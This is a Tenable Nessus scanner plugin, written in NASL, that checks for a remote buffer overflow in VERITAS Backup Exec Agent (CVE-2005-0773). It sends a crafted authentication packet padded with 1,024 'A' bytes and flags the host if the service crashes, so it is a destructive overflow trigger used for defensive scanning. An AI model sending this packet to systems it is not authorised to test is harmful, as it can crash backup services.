#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(18551);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2011/08/08 17:20:27 $");

 script_cve_id("CVE-2005-0773");
 script_bugtraq_id(14019, 14021, 14022);
 script_osvdb_id(17624);

 script_name(english:"VERITAS Backup Exec Agent for Windows CONNECT_CLIENT_AUTH Remote Overflow");
 script_summary(english:"Test the VERITAS Backup Exec Agent buffer overflow");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can be executed on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of VERITAS Backup Exec Agent
which is vulnerable to a remote buffer overflow.  An attacker may
exploit this flaw to execute arbitrary code on the remote host or to
disable this service remotely. 

To exploit this flaw, an attacker would need to send a specially
crafted packet to the remote service." );
 script_set_attribute(attribute:"solution", value:
"http://seer.support.veritas.com/docs/276604.htm" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Veritas Backup Exec Windows Remote Agent Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/22");
 script_set_attribute(attribute:"patch_publication_date", value: "2005/06/22");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/23");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:veritas_backup_exec");
 script_end_attributes();
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_require_ports("Services/veritas-backup-agent");
 script_dependencies("veritas_agent_detect.nasl");
 exit(0);
}

port = get_kb_item("Services/veritas-backup-agent");
if ( ! port ) exit(0);

connect_open_request = raw_string(
	0x80, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03
);


connect_client_auth_request = raw_string (
	0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 
	0x00, 0x00, 0x00, 0x06, 0x6E, 0x65, 0x73, 0x73, 0x75, 0x73, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00) +
	crap(data:"A", length:0x400) + raw_string (0x00, 0x00, 0x00, 0x04, 0x04);

if (!get_port_state(port))
  exit (0);

soc = open_sock_tcp (port);
if (!soc) exit (0);

buf = recv (socket:soc, length:40);
send (socket:soc, data:connect_open_request);
buf = recv (socket:soc, length:32);
send (socket:soc, data:connect_client_auth_request);
close (soc);

sleep (10);

for (i = 0; i < 3; i ++)
{
 soc = open_sock_tcp (port);
 if (soc) { close(soc); exit(0); }
 sleep(1);
}

security_hole(port);
